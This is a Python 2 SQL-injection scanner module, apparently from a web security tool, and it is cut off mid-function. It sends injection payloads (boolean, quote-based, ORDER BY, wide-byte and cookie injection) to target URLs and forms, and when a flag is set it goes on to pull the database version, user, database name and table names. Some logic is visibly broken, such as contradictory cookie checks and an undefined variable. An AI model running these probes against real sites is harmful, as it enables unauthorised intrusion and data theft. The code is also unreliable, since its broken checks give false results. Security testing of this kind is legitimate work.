#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse

from Enumeration_tableScript import *
from SqlInjection_TestScript import *
from engine_lib import yd_json as json
from engine.logger import scanLogger as logger


class SqlInjection:
    def __init__(self,url,http, domain):
        try:
            self.url=url
            self.http=http
            self.host=urlparse.urlparse(url)[1]
            self.domain = domain
            self.getv=self.checkurl(url)
            self.requesturl=urlparse.urlparse(url)[0]+"://"+urlparse.urlparse(url)[1]+urlparse.urlparse(url)[2]
            self.IsDataError=False
            self.IsSqlInjection=False
            self.databasetype=""
            self.Return_DatabaseError=''
            self.vuldict={}
        except Exception,e:
            logger.error("File:SqlInjectionScript.py, SqlInjection.__init__:" + str(e)+"URL:"+self.url)

    def GetDatabaseError(self,data):
        try:
            if data.find("You have an error in your SQL syntax") >= 0:
                return True,"mysql","You have an error in your SQL syntax"
            if data.find("supplied argument is not a valid MySQL") >=0:
                return True,"mysql","supplied argument is not a valid MySQL"
            if data.find('Microsoft JET Database Engine')>=0:
                return True,"access","Microsoft JET Database Engine"
            if data.find('Microsoft OLE DB Provider for SQL Server')>=0:
                return True,"mssql","Microsoft OLE DB Provider for SQL Server"
            if data.find('System.Data.SqlClient.SqlException')>=0:
                return True,"mssql","System.Data.SqlClient.SqlException"
            if data.find('System.Data.SqlClient.SqlException')>=0:
                return True,"mssql","System.Data.SqlClient.SqlException"
            if data.find('System.Data.OleDb.OleDbException')>=0:
                return True,"mssql","System.Data.OleDb.OleDbException"
            if data.find("[Microsoft][ODBC Microsoft Access Driver]") >= 0:
                return True,"access","[Microsoft][ODBC Microsoft Access Driver]"
            if data.find("[Microsoft][ODBC SQL Server Driver]") >= 0:
                return True,"mssql","[Microsoft][ODBC SQL Server Driver]"
            if data.find("Microsoft OLE DB Provider for ODBC Drivers</font> <font size=\"2\" face=\"Arial\">error") >= 0:
                return True,"mssql","Microsoft OLE DB Provider for ODBC Drivers</font> <font size=\"2\" face=\"Arial\">error"
            if data.find("Microsoft OLE DB Provider for ODBC Drivers") >= 0:
                return True,"mssql","Microsoft OLE DB Provider for ODBC Drivers"
            if data.find("java.sql.SQLException: Syntax error or access violation") >= 0:
                return True,"oracle","java.sql.SQLException: Syntax error or access violation"
            if data.find("PostgreSQL query failed: ERROR: parser:") >= 0:
                return True,"PostgreSQL","PostgreSQL query failed: ERROR: parser:"
            if data.find("invalid input syntax for")>=0:
                return True,"PostgreSQL","invalid input syntax for"
            if data.find("XPathException") >= 0:
                return True,"XPath","XPathException"
            if data.find("supplied argument is not a valid ldap") >= 0:
                return True,"LDAP","supplied argument is not a valid ldap"
            if data.find("javax.naming.NameNotFoundException") >= 0:
                return True,"LDAP","javax.naming.NameNotFoundException"
            if data.find("DB2 SQL error:") >= 0:
                return True,"db2","DB2 SQL error:"
            if data.find('[IBM][JDBC Driver]')>=0:
                return True,"db2","[IBM][JDBC Driver]"

            if data.find("Dynamic SQL Error") >= 0:
                return True,"Interbase","Dynamic SQL Error"
            if data.find("Sybase message:") >= 0:
                return True,"sybase","Sybase message:"
            ora_test = re.search("ORA-[0-9]{4,}", data)
            if ora_test != None:
                return True,"oracle","ORA"
            return False,"",""
        except Exception,e:
            logger.error("File:SqlInjectionScript.py, SqlInjection.GetDatabaseError:" + str(e)+"URL:"+self.url)
            return False,"",""

    #END DEF
    def GetKey(self,contenterror):
        try:
            listkey=[]
            contentlist=self.contentinit.split("\r\n")
            for i in contentlist:
                if contenterror.find(i)<0:
                    listkey.append(i)
                    if len(listkey)>=2:
                        return listkey[1]
            if len(listkey)==1:
                return None
            if len(listkey)==0:
                return None
        except Exception,e:
            logger.error("File:SqlInjectionScript.py, SqlInjection.GetKey:" + str(e)+"URL:"+self.url)
            return None
    #end def

    def checkurl(self,url):
        try:

            r = urlparse.urlparse(url)
            getquery = r.query

            if getquery.find("&")>=0:
                getquerylist = getquery.split("&")

                return getquerylist[len(getquerylist)-1]

            else:
                return getquery
        except Exception,e:
            logger.error("File:SqlInjectionScript.py, SqlInjection.Checkurl:" + str(e)+"URL:"+self.url)
            return False


    def SqlInjectionForCookie(self):
        headers = {}
        if self.getv:
            headers={"Host": self.domain,"User-Agent":" Mozilla/5.0 (Windows NT 5.1; rv:14.0)\
                     Gecko/20100101 Firefox/14.0.1","Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,\
                     */*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding":" gzip, \
                     deflate","Connection": "keep-alive","Cookie": "\
                     "+self.getv+"%27"}
            responsecookie,cotnentcookie = self.http.request(self.requesturl, "GET",'',headers)
            self.IsSqlInjection,self.databasetype,self.Return_DatabaseError = self.GetDatabaseError(cotnentcookie)
            if self.IsSqlInjection:
                return True,"存在注入的URL：%s\n该注入类型为：HEAD提交方式的基于数据库错误信息的COOKIES注入"%(self.url),self.databasetype
            else:
                return False,"",""
        else:
            return False,"",""
        #end if
    #end def

    def TestSql(self):

        try:
            response2,content2=self.http.request(self.url+"%20aNd(1=1)", headers={'Host':self.domain})
            len2=len(content2)
            status2=response2['status']
            response3,content3=self.http.request(self.url+"%20aNd(1=2)", headers={'Host':self.domain})
            len3=len(content3)
            status3=response3['status']
            getkey=self.GetKey(content3)

            if getkey:
                if content2.find(getkey) >= 0 and content3.find(getkey) < 0 and status2 == '200' and (status3 == '200' or status3 == '500'):
                    self.IsSqlInjection=True
                    return True,"存在注入的URL：%s\n该注入类型为：GET提交方式的数字型注入"%(self.url),getkey
            else:
                self.IsSqlInjection=False

        except Exception,e:
            logger.error("File:SqlInjectionScript.py, SqlInjection.TestSql.one:" + str(e)+"URL:"+self.url)
            self.IsSqlInjection=False

        if self.IsSqlInjection==False:

            try:
                response4,content4=self.http.request(self.url+"%27%20aNd%20%271%27=%271",  headers={'Host':self.domain})
                len4=len(content4)
                status4=response4['status']
                response5,content5=self.http.request(self.url+"%27%20aNd%20%271%27=%272",  headers={'Host':self.domain})
                len5=len(content5)
                status5=response5['status']

                getkey=self.GetKey(content5)

                if getkey:

                    if content4.find(getkey) >= 0 and content5.find(getkey) < 0 and status4 == '200' and (status5 == '200' or status5 == '500'):
                        self.IsSqlInjection = True
                        return True,"存在注入的URL：%s\n该注入类型为：GET提交方式的字符型注入"%(self.url),getkey
                else:
                    self.IsSqlInjection=False

            except Exception,e:
                logger.error("File:SqlInjectionScript.py, SqlInjection.TestSql.two:" + str(e)+"URL:"+self.url)
                self.IsSqlInjection=False
            #end try
        #end if

        if self.IsSqlInjection==False:
            getkey=''

            try:
                response4,content4=self.http.request(self.url+"%20OrDER%20bY(1)--",  headers={'Host':self.domain})
                len4=len(content4)
                status4=response4['status']
                response5,content5=self.http.request(self.url+"%20OrDER%20bY(1000)--",  headers={'Host':self.domain})
                len5=len(content5)
                status5=response5['status']
                getkey=self.GetKey(content5)

                if getkey:

                    if content4.find(getkey) >= 0 and content5.find(getkey) < 0 and status4 == '200' and (status5 == '200' or status5 == '500'):
                        self.IsSqlInjection=True
                        return True,"存在注入的URL：%s\n该注入类型为：GET提交方式的数字型注入\n该URL是通过模糊方式判断，可能存在误报。"%(self.url),getkey
                    else:
                        self.IsSqlInjection=False
                        return False,"",getkey
                else:
                    self.IsSqlInjection=False
                    return False,"" ,getkey

            except Exception,e:
                logger.error("File:SqlInjectionScript.py, SqlInjection.TestSql.four:" + str(e)+"URL:"+self.url)
                self.IsSqlInjection=False
                return False,"",getkey
            #end try
        #end if
    #end def

    def CheckDatabaseError(self):

        if self.IsSqlInjection==False:
            try:
                response,content=self.http.request(self.url+"%5C",  headers={'Host':self.domain})
                self.IsDataError,self.databasetype,self.Return_DatabaseError =self.GetDatabaseError(content)
                if self.IsDataError==False:
                    headers = {}
                    if self.getv:
                        headers={"Host": self.domain,"User-Agent":" Mozilla/5.0 (Windows NT 5.1; rv:14.0)\
                        Gecko/20100101 Firefox/14.0.1","Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,\
                        */*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding":" gzip, \
                        deflate","Connection": "keep-alive","Cookie":self.getv+"%5C"}
                        responsecookie,cotnentcookie=self.http.request(self.requesturl, "GET",'',headers)
                        self.IsDataError,self.databasetype,self.Return_DatabaseError  =self.GetDatabaseError(cotnentcookie)
                        if self.IsDataError:
                            return True,"发现数据库错误模式"
                        else:
                            return False,""
                    else:
                        return False,""

                else:
                    return True,"发现数据库错误模式"
                #end if

            except Exception,e:
                logger.error("File:SqlInjectionScript.py, SqlInjection.TestSql.three:" + str(e)+"URL:"+self.url)
                return False,""
            #end try
        #end if
    #end def
    
    def WidebyteInjection(self):#宽字节SQL注入功能模块
        if self.IsSqlInjection==False:
            try:
                
                response,content=self.http.request(self.url+"%d5'",  headers={'Host':self.domain})
                self.IsDataError,self.databasetype,self.Return_DatabaseError =self.GetDatabaseError(content)
                if self.IsDataError==True:
                    self.IsSqlInjection=True
                    return True,"发现宽字节SQL注入"
                #end if
            except Exception,e:
                logger.error("File:SqlInjectionScript.py, SqlInjection.WidebyteInjection:" + str(e)+"URL:"+self.url)
                self.IsSqlInjection=False
                return False,""
            #end try
        #end if 
    #end def
        

    def TrySqlInjectionCookie(self):

        if self.getv:
            try:
                headers={"Host": self.domain,"User-Agent":" Mozilla/5.0 (Windows NT 5.1; rv:14.0)\
                         Gecko/20100101 Firefox/14.0.1","Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,\
                         */*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding":" gzip, \
                         deflate","Connection": "keep-alive","Cookie": "\
                         "+self.getv+"%20aNd(32=32)"}
                headers1={"Host": self.domain,"User-Agent":" Mozilla/5.0 (Windows NT 5.1; rv:14.0)\
                         Gecko/20100101 Firefox/14.0.1","Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,\
                         */*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding":" gzip, \
                         deflate","Connection": "keep-alive","Cookie": "\
                         "+self.getv+"%20aNd(33=34)"}

                responsecookie1,cotnentcookie1=self.http.request(self.requesturl, "GET",'',headers)
                responsecookie2,cotnentcookie2=self.http.request(self.requesturl, "GET",'',headers1)
                cookiestatues1=responsecookie1['status']
                cookiestatues2=responsecookie2['status']
                getkey=self.GetKey(cotnentcookie2)
                if getkey:

                    if cotnentcookie1.find(getkey)>=0 and cotnentcookie1.find(getkey)<0 and cookiestatues1=='200' and(cookiestatues2=='200' or cookiestatues2=='500') :
                        self.IsSqlInjection=True
                        return True,"存在注入的URL：%s\n该注入类型为：HEAD提交方式的数字型COOKIES注入"%(self.url),getkey
                    else:
                        self.IsSqlInjection=False
                    #end if
            except Exception,e:

                logger.error("File:SqlInjectionScript.py, SqlInjection.TrySqlInjectionCookie.one:" + str(e)+"URL:"+self.url)
                self.IsSqlInjection=False
            #end if
            if self.IsSqlInjection==False:
                try:

                    headers={"Host": self.domain,"User-Agent":" Mozilla/5.0 (Windows NT 5.1; rv:14.0)\
                         Gecko/20100101 Firefox/14.0.1","Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,\
                         */*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding":" gzip, \
                         deflate","Connection": "keep-alive","Cookie": "\
                         "+self.getv+"%27%20aNd%20%273%27=%273"}
                    headers1={"Host": self.domain,"User-Agent":" Mozilla/5.0 (Windows NT 5.1; rv:14.0)\
                         Gecko/20100101 Firefox/14.0.1","Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,\
                         */*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding":" gzip, \
                         deflate","Connection": "keep-alive","Cookie": "\
                         "+self.getv+"%27aNd%20%2733%27=%2734"}

                    responsecookie1,cotnentcookie1=self.http.request(self.requesturl, "GET",'',headers)
                    responsecookie2,cotnentcookie2=self.http.request(self.requesturl, "GET",'',headers1)
                    cookiestatues1=responsecookie1['status']
                    cookiestatues2=responsecookie2['status']
                    getkey=self.GetKey(cotnentcookie2)
                    if getkey:

                        if cotnentcookie1.find(getkey)>=0 and cotnentcookie1.find(getkey)<0 and cookiestatues1=='200' and (cookiestatues2=='200' or cookiestatues2=='500'):
                            self.IsSqlInjection=True
                            return True,"存在注入的URL：%s\n该注入类型为：HEAD提交方式的字符型COOKIES注入",getkey
                        else:
                            self.IsSqlInjection=False
                        #end if
                    #end if
                except Exception,e:
                    logger.error("File:SqlInjectionScript.py, SqlInjection.TrySqlInjectionCookie.two:" + str(e)+"URL:"+self.url)
                    self.IsSqlInjection=False
            #end if

            if self.IsSqlInjection==False:
                try:
                    headers={"Host": self.domain,"User-Agent":" Mozilla/5.0 (Windows NT 5.1; rv:14.0)\
                         Gecko/20100101 Firefox/14.0.1","Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,\
                         */*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding":" gzip, \
                         deflate","Connection": "keep-alive","Cookie": "\
                         "+self.getv+"OrDeR%20bY(1)--"}
                    headers1={"Host": self.domain,"User-Agent":" Mozilla/5.0 (Windows NT 5.1; rv:14.0)\
                         Gecko/20100101 Firefox/14.0.1","Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,\
                         */*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding":" gzip, \
                         deflate","Connection": "keep-alive","Cookie": "\
                         "+self.getv+"OrDeR%20bY(1000)--"}

                    responsecookie1,cotnentcookie1=self.http.request(self.requesturl, "GET",'',headers)
                    responsecookie2,cotnentcookie2=self.http.request(self.requesturl, "GET",'',headers1)
                    cookiestatues1=responsecookie1['status']
                    cookiestatues2=responsecookie2['status']
                    getkey=self.GetKey(cotnentcookie2)
                    if getkey:

                        if cotnentcookie1.find(getkey)>=0 and cotnentcookie1.find(getkey)<0 and cookiestatues1=='200' and (cookiestatues2=='200' or cookiestatues2=='500'):
                            self.IsSqlInjection=True
                            return True,"存在注入的URL：%s\n该注入类型为：HEAD提交方式的数字型COOKIES注入\n该URL是通过模糊方式判断，可能存在误报。",getkey
                        else:
                            self.IsSqlInjection=False
                            return False,"",getkey
                    else:
                        return False,"",getkey
                    #end if
                except Exception,e:
                    logger.error("File:SqlInjectionScript.py, SqlInjection.TrySqlInjectionCookie.three:" + str(e)+"URL:"+self.url)
                    return False,"",""
                #end if
            #end if
        #end if
    #end def

    def audit(self,url):
        try:
            self.responseinit=""
            self.contentinit=""
            self.responseinit,self.contentinit=self.http.request(self.url,  headers={'Host':self.domain})
            self.status=self.responseinit['status']
            self.len=len(self.contentinit)
            if self.status != '404' and self.len != 0:
                new_url = self.url+"%27%22"
                response1,content1=self.http.request(new_url,  headers={'Host':self.domain})
                len1=len(content1)
                status1=response1['status']
                if len1>0:
                    self.IsSqlInjection,self.databasetype,self.Return_DatabaseError =self.GetDatabaseError(content1)
                if self.IsSqlInjection:
                    self.vuldict = {'id':"1",'vul_type':"SQL注入",
                                   'detail':"存在注入的URL：%s\n该注入类型为：GET提交方式的基于数据库错误信息的SQL注入"%(self.url),
                                   'level':"HIGH","databasetype":self.databasetype,"DatabaseError":self.Return_DatabaseError,
                                   'request': getRequest(new_url, domain=ob['domain']),
                                   'response': getResponse(response1),
                                   }
                    return self.vuldict
                else:
                    Widesql=self.WidebyteInjection()
                    if self.IsSqlInjection:
                        if Widesql[0]:
                            
                            self.vuldict = {'id':"1",'vul_type':"SQL注入",'detail':"存在注入的URL：%s\n该注入类型为：宽字节SQL注入"%(self.url),
                                           'level':"HIGH","databasetype":self.databasetype,"DatabaseError":self.Return_DatabaseError,
                                           'request': getRequest(new_url, domain=ob['domain']),
                                           'response': getResponse(response1)
                                           }
                            return self.vuldict
                        #end if
                        
                    else:

                        testsql=self.TestSql()
                        if self.IsSqlInjection:
                            if testsql[0]:
                                self.vuldict = {'id':"1",'vul_type':"SQL注入",'detail':testsql[1],'level':"HIGH",
                                               "databasetype":self.databasetype,"DatabaseError":self.Return_DatabaseError,
                                               'request': getRequest(new_url, domain=ob['domain']),
                                               'response': getResponse(response1)
                                               }
                                return self.vuldict
                        else:
                            SqlInjectionForcookie=self.SqlInjectionForCookie()
                            if self.IsSqlInjection:
                                if SqlInjectionForcookie[0]:
                                    self.vuldict = {'id':"1",'vul_type':"SQL注入",'detail':SqlInjectionForcookie[1],'level':"HIGH",
                                                   "databasetype":self.databasetype,"DatabaseError":self.Return_DatabaseError,
                                                   'request': getRequest(new_url, domain=ob['domain']),
                                                   'response': getResponse(response1)
                                                   }
                                    return self.vuldict
                            else:
                                TrySqlInjectioncookie=self.TrySqlInjectionCookie()
                                if self.IsSqlInjection:
                                    if TrySqlInjectioncookie[0]:
                                        self.vuldict = {'id':"1",'vul_type':"SQL注入",'detail':TrySqlInjectioncookie[1],'level':"HIGH",
                                                       "databasetype":self.databasetype,"DatabaseError":self.Return_DatabaseError,
                                                       'request': getRequest(new_url, domain=ob['domain']),
                                                       'response': getResponse(response1)
                                                       }
                                        return self.vuldict
                                else:
    
                                    GetDatabaseErr=self.CheckDatabaseError()
                                    if self.IsDataError==True:
                                        if GetDatabaseErr[0]:
                                            self.vuldict = {'id':"28",'vul_type':"发现数据库错误模式",'detail':GetDatabaseErr[1],
                                                           'level':"HIGH","databasetype":self.databasetype,"DatabaseError":self.Return_DatabaseError,
                                                           'request': getRequest(new_url, domain=ob['domain']),
                                                           'response': getResponse(response1)
                                                           }
                                            return self.vuldict
                                    else:
                                        return False
                                    #end if
                                #end if
                            #end if
                        #end if
                #end if
                
            return False
        except Exception,e:
            logger.error("File:SqlInjectionScript.py, SqlInjection.audit:" + str(e)+",URL:"+self.url)
            return False
        #end try


class sql_injection_result(object):
    def __init__(self, arg, arglist, request, response, sqltype,PostDatabaseType,ReturnPostDataError):
        self.arg = arg
        self.arglist = arglist
        self.request = request
        self.response = response
        self.sqltype  = sqltype
        self.PostDatabaseType=PostDatabaseType
        self.ReturnPostDataError=ReturnPostDataError
    #end def
#end class

class SqlInjectionPostCheck(object):

    def __init__(self, domain):
        self.PostDatabaseType=''
        self.ReturnPostDataError=''
        self.domain = domain
    #end def

    def GetDatabaseError(self,data):
        try:
            if data.find("You have an error in your SQL syntax") >= 0:
                return True,"mysql","You have an error in your SQL syntax"
            if data.find("supplied argument is not a valid MySQL") >=0:
                return True,"mysql","supplied argument is not a valid MySQL"
            if data.find('Microsoft JET Database Engine')>=0:
                return True,"access",'Microsoft JET Database Engine'
            if data.find('Microsoft OLE DB Provider for SQL Server')>=0:
                return True,"mssql",'Microsoft OLE DB Provider for SQL Server'
            if data.find('System.Data.SqlClient.SqlException')>=0:
                return True,"mssql",'System.Data.SqlClient.SqlException'
            if data.find('System.Data.SqlClient.SqlException')>=0:
                return True,"mssql",'System.Data.SqlClient.SqlException'
            if data.find('System.Data.OleDb.OleDbException')>=0:
                return True,"mssql",'System.Data.OleDb.OleDbException'
            if data.find("[Microsoft][ODBC Microsoft Access Driver]") >= 0:
                return True,"access",'[Microsoft][ODBC Microsoft Access Driver]'
            if data.find("[Microsoft][ODBC SQL Server Driver]") >= 0:
                return True,"mssql","[Microsoft][ODBC SQL Server Driver]"
            if data.find("Microsoft OLE DB Provider for ODBC Drivers</font> <font size=\"2\" face=\"Arial\">error") >= 0:
                return True,"mssql","Microsoft OLE DB Provider for ODBC Drivers</font> <font size=\"2\" face=\"Arial\">error"
            if data.find("Microsoft OLE DB Provider for ODBC Drivers") >= 0:
                return True,"mssql","Microsoft OLE DB Provider for ODBC Drivers"
            if data.find("java.sql.SQLException: Syntax error or access violation") >= 0:
                return True,"oracle","java.sql.SQLException: Syntax error or access violation"
            if data.find("PostgreSQL query failed: ERROR: parser:") >= 0:
                return True,"PostgreSQL","PostgreSQL query failed: ERROR: parser:"
            if data.find("XPathException") >= 0:
                return True,"XPath","XPathException"
            if data.find("supplied argument is not a valid ldap") >= 0:
                return True,"LDAP","supplied argument is not a valid ldap"
            if data.find("javax.naming.NameNotFoundException") >= 0:
                return True,"LDAP","javax.naming.NameNotFoundException"
            if data.find("DB2 SQL error:") >= 0:
                return True,"db2","DB2 SQL error:"
            if data.find('[IBM][JDBC Driver]')>=0:
                return True,"db2","[IBM][JDBC Driver]"

            if data.find("Dynamic SQL Error") >= 0:
                return True,"Interbase",'Dynamic SQL Error'
            if data.find("Sybase message:") >= 0:
                return True,"sybase",'Sybase message:'
            ora_test = re.search("ORA-[0-9]{4,}", data)
            if ora_test != None:
                return True,"oracle",'ORA'
            return False,"",""
        except Exception,e:
            print e

    #END DEF

    def get_post_request(self,url, post_data):

        if url.find("http://") != -1:
            d = url.replace("http://", "").split("/")[0]
            tmpurl =  url.replace("http://" + url.replace("http://", "").split("/")[0], "")
            if len(tmpurl) == 0:
                tmpurl = "/"
        elif url.find("https://") != -1:
            d = url.replace("https://", "").split("/")[0]
            tmpurl =  url.replace("https://" + url.replace("https://", "").split("/")[0], "")
            if len(tmpurl) == 0:
                tmpurl = "/"
        else:
            return ""
        #end if

        try:

            content = "POST" + " " + tmpurl + "  HTTP/1.1" + "\n"
            content += "Host: " + d + "\n"
            content += "Connection: Keep-alive" + "\n"
            content += "Accept: text/plain" + "\n"
            content += "Content-Length: %d" % int(len(post_data)) + "\n"
            content += "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5" + "\n\n"
            content += post_data

            return content
        except Exception,e:
            print e
            return ""
        #end try
    #end def

    def GetKey(self, one, two):
        try:
            listkey=[]
            contentlist = one.split("\r\n")
            for i in contentlist:
                if two.find(i) < 0:
                    listkey.append(i)
                    if len(listkey) >= 2:
                        return listkey[1]

            if len(listkey) == 1:
                return listkey[0]
            if len(listkey) == 0:
                return None
        except Exception,e:
            print e
    #end def

    def get_raw_params(self, params_dict):
        try:
            if params_dict and len(params_dict) > 0:
                ret = []
                for k in params_dict.keys():
                    if params_dict[k]=="":
                        params_dict[k]="nvs_test"
                    ret.append(k + "=" + params_dict[k])
                #end for
                return "&".join(ret)
            #end if
        except Exception, e:
            print e
        #end try
        return ""
    #end def


    def check(self, http, url, action_info):
        ret = []

        temp_url = urllib.unquote(url)

        form_vars = json.read(action_info)

        need_to_check_vars = []

        parms = {}

        for v in form_vars:
            t = v.get("type")
            n = v.get("name")
            z = v.get("value")

            parms.setdefault(n, z)

            if t and (t == "text" or t == "radio" or t == "select" or t == "check" or t=="password" or t=="hidden") :
                if n not in need_to_check_vars:
                    need_to_check_vars.append(n)
                #end if
            #end if
        #end for

        for v in need_to_check_vars:
            tmp_parms = parms.copy()

            tmp_parms[v] = "test'"
            post_data = self.get_raw_params(tmp_parms)
            try:
                resp, tmp_data = http.request(url, "POST", post_data, {"Content-Type":"application/x-www-form-urlencoded", "Host":self.domain})
                if self.GetDatabaseError(tmp_data)[0]:

                    self.PostDatabaseType=self.GetDatabaseError(tmp_data)[1]
                    self.ReturnPostDataError=self.GetDatabaseError(tmp_data)[2]

                    ret.append(sql_injection_result(v, post_data, self.get_post_request(temp_url, post_data), getResponse(resp), 1,self.PostDatabaseType,self.ReturnPostDataError))

                    continue
                #end if


            except Exception,e:
                logger.error("File:SqlInjectionScript.py, check function:" + str(e))
            #end try

            #2... check:1
            #           1%' and'%'='
            #           1%' and'1'='


            try:

                tmp_parms[v] = "1"
                post_data_1 = self.get_raw_params(tmp_parms)
                
                resp1, tmp_data_1 = http.request(url, "POST", post_data_1, {"Content-Type":"application/x-www-form-urlencoded", "Host":self.domain})
                

                tmp_parms[v] = "1%'and'%'='"
                post_data_2 = self.get_raw_params(tmp_parms)
                
                resp2, tmp_data_2 = http.request(url, "POST", post_data_2, {"Content-Type":"application/x-www-form-urlencoded", "Host":self.domain})
                

                tmp_parms[v] = "1%'and'1'='"

                post_data_3 = self.get_raw_params(tmp_parms)
                
                resp3, tmp_data_3 = http.request(url, "POST", post_data_3, {"Content-Type":"application/x-www-form-urlencoded", "Host":self.domain})
                

                usekey = self.GetKey(tmp_data_1, tmp_data_3)
               

                if usekey:
                    
                   
                    if tmp_data_2.find(usekey)>=0 and tmp_data_3.find(usekey)<0 :

                        ret.append(sql_injection_result(v, post_data_3, self.get_post_request(temp_url, post_data_3), getResponse(resp3), 2,self.PostDatabaseType,self.ReturnPostDataError))
                    #end if
                #end if

            except Exception,e:
                logger.error("File:SqlInjectionScript.py, check function:" + str(e))
            #end try
        #end for
        return ret
#end class


def run_url(http,ob,item):
    try:
        list = []
        isstart='0'
        responsedetail=''
        if item['params'] == "":
            return list
        if item['method'] == 'get' and item['params'].find("=")<0:

            return list
        #end if
        domain = ob['domain']
        source_ip = ob.get('source_ip')
        tmp_url = urllib.unquote(item['url'])  
        parse=urlparse.urlparse(tmp_url)
        path=parse.path
        if path=="" or path=="/":
            return list
        path=path.lower()
        if path.find(".css")>=0 or path.find(".doc")>=0 or path.find(".txt")>=0 or path.find(".pdf")>=0:
            return list
        url_parse = urlparse.urlparse(tmp_url)
        scheme = url_parse.scheme
        netloc = url_parse.netloc
        path = url_parse.path
        query = url_parse.query

        if source_ip:
            netloc = source_ip
        if query:
            tmp_url = "%s://%s%s?%s" % (scheme, netloc, path, query)
        else:
            tmp_url = "%s://%s%s" % (scheme, netloc, path)

        if item['method'] == 'get':
            url_list = []
            params = changeParams(item['params'])
            for row in params:
                url = "%s?%s" % (tmp_url,row)
                if url.find("http://bbs.")>=0 or url.find("/bbs/forum.php?")>=0:
                    return list
                object=SqlInjection(url,http, domain)
        
                res = object.audit(url)
                if res:
                    if  ob['isstart']=='1':

                        tablename=[]
                        database_version=''
                        database_Current_user=''
                        databasename=''
                        Gettables=''
                        tablenum=0
                        if res['databasetype']!='' and  res['databasetype']!='access' and res['databasetype']!='XPath' and  res['databasetype']!='db2' and  res['databasetype']!='LDAP' and  res['databasetype']!='Interbase' and  res['databasetype']!='sybase':

                            SqlInjection_GetVale=SqlInjection_Test(url,res['databasetype'],http,ob['task_id'],ob['domain_id'])
                            database_version=SqlInjection_GetVale.SqlInj_Get_Version()
                            database_Current_user=SqlInjection_GetVale.SqlInj_Get_Current_user()
                            databasename=SqlInjection_GetVale.SqlInj_Get_Database()

                            if database_version.find("(@@VERSION=0)")>=0:
                                databasename=''
                                database_Current_user=''
                                database_version=''
                            #end if

                            if databasename!="" and databasename!='None' :
                                tablename,tablenum=SqlInjection_GetVale.SqlInj_Get_Table(databasename)
                                Gettables=Get_tables(tablename)
                            #end if

                            responsedetail=response_detail(database_version,databasename,database_Current_user,Gettables,tablenum)
                        #end if

                        if res['databasetype']!='mysql' and res['databasetype']!='mssql' and res['databasetype']!='oracle' and res['databasetype']!='PostgreSQL' and  res['databasetype']!='' :
                            tablename=main(url,res['DatabaseError'],res['databasetype'],'Get')
                            tablename = check_tables(tablename)
                            Gettables=Get_tables(tablename)
                            if len(tablename)>0:

                                responsedetail="\n前%s个数据表为：\n%s"%(len(tablename),Gettables)
                            else:
                                responsedetail=''
                            #end if
                        #end if
                    if responsedetail!='':
                        responsedetail="%s%s"%('验证性扫描结果：',responsedetail)
                    #list.append(getRecord(ob,url,ob['level'],res['detail']+"\n"+responsedetail,""))
                    #list.append(getRecord(ob,url,ob['level'],detail=res['detail']+responsedetail, request=row.request, response=row.response))
                    list.append(getRecord(ob,url,ob['level'],detail=res['detail'], request=res['request'], response=res['response']))
                #end if
            #end for
        elif item['method'] == 'post':
            object = SqlInjectionPostCheck(ob['domain'])
            res = object.check(http, tmp_url,item['params'])
            if len(res) > 0:
                detail = ""
                responsepostdetail=''
                for row in res:
                    if row.sqltype == 1:
                        responsepostdetail=''
                        Post_Table_name=''
                        tablenum=0
                        Post_Table_names=''
                        Post_Table_name=[]
                        Post_Version=""
                        detail = detail + u"存在注入参数为：{\"%s\" }\n注入类型为：POST提交方式的基于数据库错误信息的SQL注入。\n"  % (row.arg)
                        postdata=row.arglist.replace("'","")
                        if  ob['isstart']=='1':
                            if row.PostDatabaseType!='' and row.PostDatabaseType!="access" and  row.PostDatabaseType!="db2" and row.PostDatabaseType!="XPath" and  row.PostDatabaseType!="LDAP" and  row.PostDatabaseType!="Interbase"  and  row.PostDatabaseType!="sybase":

                                SqlInjection_PostVale=SqlInjection_Test(tmp_url,row.PostDatabaseType,http,ob['task_id'],ob['domain_id'])

                                Post_Current_user=SqlInjection_PostVale.SqlInj_Post_Current_user(postdata,row.arg)

                                Post_Version=SqlInjection_PostVale.SqlInj_Post_Version(postdata,row.arg)

                                Post_Database=SqlInjection_PostVale.SqlInj_Post_Database(postdata,row.arg)

                                if Post_Database!="" and Post_Database!='None' :

                                    Post_Table_name,tablenum=SqlInjection_PostVale.SqlInj_Post_Table(postdata,row.arg,Post_Database)

                                    Post_Table_names=Get_tables(Post_Table_name)

                                responsepostdetail=response_detail(Post_Version,Post_Database,Post_Current_user,Post_Table_names,tablenum)

                            if row.PostDatabaseType!='' and row.PostDatabaseType!='mssql' and row.PostDatabaseType!='mysql' and row.PostDatabaseType!='oracle' and row.PostDatabaseType!='PostgreSQL':
                                Post_Table_name=main(tmp_url,row.ReturnPostDataError,row.PostDatabaseType,'Post',postdata,row.arg)
                                Post_Table_name = check_tables(Post_Table_name)
                                Post_Table_names=Get_tables(Post_Table_name)
                                if len(Post_Table_name)>0:
                                    responsedetail="\n前%s个数据表为：\n%s"%(len(Post_Table_name),Post_Table_names)
                                else:
                                    responsedetail=''


                    elif row.sqltype == 2:
